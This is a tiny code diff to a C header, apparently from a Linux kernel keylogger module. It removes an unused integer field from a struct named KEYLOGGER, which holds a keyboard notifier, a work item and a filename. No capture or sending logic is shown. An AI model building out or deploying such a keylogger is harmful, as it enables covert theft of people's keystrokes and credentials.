@@ -13,6 +13,5 @@
         struct notifier_block key_notifier;
         struct work_struct work_struct;
         char* filename;
-        int a;
     }KEYLOGGER;
 #endif
